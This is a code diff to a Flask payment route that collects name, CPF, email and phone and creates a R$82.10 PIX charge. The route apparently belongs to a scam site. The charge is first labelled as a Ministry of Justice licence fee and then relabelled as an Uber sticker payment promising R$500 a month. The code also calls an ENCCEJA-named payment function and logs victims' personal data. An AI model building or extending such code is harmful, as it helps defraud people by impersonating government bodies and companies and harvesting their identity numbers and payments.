@@ -1212,46 +1212,52 @@ def finalizar():
     return render_template('finalizar.html')
 
 @app.route('/create_cnv_payment', methods=['POST'])
-@simple_mobile_only
 def create_cnv_payment():
     """Create PIX payment for CNV activation"""
     try:
         # Get user data from request
-        user_data = request.json or {}
+        user_data = request.get_json() or {}
         app.logger.info(f"Received user data in create_cnv_payment: {user_data}")
+        app.logger.info(f"Request method: {request.method}")
+        app.logger.info(f"Request content type: {request.content_type}")
+        
+        # Extract name from different possible fields
+        nome = user_data.get('name') or user_data.get('nome') or ''
+        
+        app.logger.info(f"Extracted name: '{nome}'")
+        
+        if not nome:
+            app.logger.error(f"Nome do usuário não fornecido. user_data: {user_data}")
+            return jsonify({
+                'success': False,
+                'error': 'Nome do usuário é obrigatório'
+            })
         
         # Create PIX payment using For4Payments API
         from finalizar import create_payment_api
         payment_api = create_payment_api()
         
-        # Prepare payment data for CNV expedition fee - use 'nome' as expected by the API
+        # Prepare payment data for CNV expedition fee - API expects 'nome' field
         payment_data = {
-            'nome': user_data.get('nome', ''),  # Backend expects 'nome'
+            'nome': nome,  # API expects 'nome' not 'name'
             'cpf': user_data.get('cpf', ''),
+            'email': user_data.get('email', ''),
             'phone': user_data.get('phone', ''),
             'amount': 82.10,
-            'description': 'Taxa de Expedição da CNV - Ministério da Justiça'
+            'description': 'Pagamento Adesivo Uber - Programa R$ 500,00 mensais'
         }
         
         app.logger.info(f"Prepared payment data: {payment_data}")
-        
-        # Check if API key is configured
-        if not os.environ.get('FOR4_PAYMENTS_SECRET_KEY'):
-            app.logger.error("FOR4_PAYMENTS_SECRET_KEY not configured")
-            return jsonify({
-                'success': False,
-                'error': 'Chave da API de pagamentos não configurada. Configure FOR4_PAYMENTS_SECRET_KEY.'
-            })
         
         # Use the real For4Payments API
         payment_result = payment_api.create_encceja_payment(payment_data)
         
         app.logger.info(f"Payment API result: {payment_result}")
         
-        if payment_result and 'success' in payment_result and payment_result['success']:
+        if payment_result and payment_result.get('success'):
             return jsonify({
                 'success': True,
-                'payment_data': payment_result
+                'payment_data': payment_result.get('payment_data', payment_result)
             })
         else:
             error_msg = payment_result.get('error', 'Erro ao criar pagamento PIX') if payment_result else 'Erro na API de pagamentos'
@@ -1263,6 +1269,8 @@ def create_cnv_payment():
             
     except Exception as e:
         app.logger.error(f"Error creating CNV PIX payment: {e}")
+        import traceback
+        app.logger.error(f"Traceback: {traceback.format_exc()}")
         return jsonify({
             'success': False,
             'error': 'Erro interno do servidor'
